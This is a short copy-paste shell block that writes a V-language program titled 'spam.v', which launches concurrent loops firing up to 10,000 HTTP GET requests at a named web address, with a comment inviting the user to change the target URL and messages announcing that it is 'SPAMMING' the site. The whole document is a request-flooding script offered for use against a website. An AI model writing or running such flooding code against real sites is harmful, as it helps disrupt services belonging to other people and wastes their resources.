# Copy-paste this entire block:
cat > spam.v << 'EOF'
module main
import net.http
import time
fn main() {
    url := "https://sts-network.vercel.app/"  // CHANGE THIS URL
    println("🔥 SPAMMING $url with 2 H2 connections")
    for i := 0; i < 2; i++ {
        go fn [url] () {
            for j := 0; j < 5000; j++ {
                http.get(url) or { continue }
                print(".")
            }
        }()
    }
    time.sleep(10)
    println("\n✅ Done spamming for 10 seconds")
}
EOF
